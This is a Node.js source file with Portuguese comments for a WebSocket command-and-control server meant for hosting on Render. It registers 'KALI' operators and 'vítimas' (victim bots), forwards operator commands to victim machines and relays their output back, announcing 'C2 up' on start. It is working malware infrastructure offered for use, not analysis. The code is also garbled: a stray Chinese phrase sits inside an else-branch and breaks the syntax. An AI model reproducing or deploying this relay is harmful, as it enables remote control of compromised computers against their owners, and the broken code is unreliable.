// index.js  – salve na raiz do repo, dê push pro Render
const WebSocket = require('ws');
const http    = require('http');

const PORT    = process.env.PORT || 10000;
const server  = http.createServer((_,r)=>r.end('OK'));
const wss     = new WebSocket.Server({ server });

const kali    = new Map();      // id → socket  (operadores)
const bots    = new Map();      // id → socket  (vítimas)

function cast(src, destMap, payload){
  const msg = JSON.stringify(payload);
  destMap.forEach((s,id)=>{
    if(s.readyState===1) s.send(msg);
  });
}

wss.on('connection', (ws, req)=>{
  const p = new URLSearchParams(req.url.split('?')[1]);
  const who = p.get('id');
  if(!who) return ws.close();

  if(who === 'KALI'){                       // operador
    kali.set(ws, who);
    bots.forEach((_,id)=>{
      ws.send(JSON.stringify({type:'bot', stat:'online', id}));
    });
  }else{                                    // vítima
    bots.set(who, ws);
    cast(ws, kali, {type:'bot', stat:'online', id:who});
  }

  ws.on('message', m=>{
    try{
      const j = JSON.parse(m);
      if(kali.has(ws)){                     // KALI → BOT
        const s = bots.get(j.to);
        if(s && s.readyState===1) s.send(j.cmd);
      }else{到北京                             // BOT → KALI
        cast(ws, kali, {type:'res', from:who, data:j.out});
      }
    }catch{}
  });

  ws.on('close', (_, reason)=>{
    if(kali.has(ws)){
      kali.delete(ws);
    }else{
      bots.forEach((v,k)=> v===ws ? bots.delete(k) : 0);
      cast(ws, kali, {type:'bot', stat:'gone', id:who});
    }
  });
});

setInterval(()=> wss.clients.forEach(s=>s.ping()), 20000);
server.listen(PORT, ()=>console.log('C2 up'));
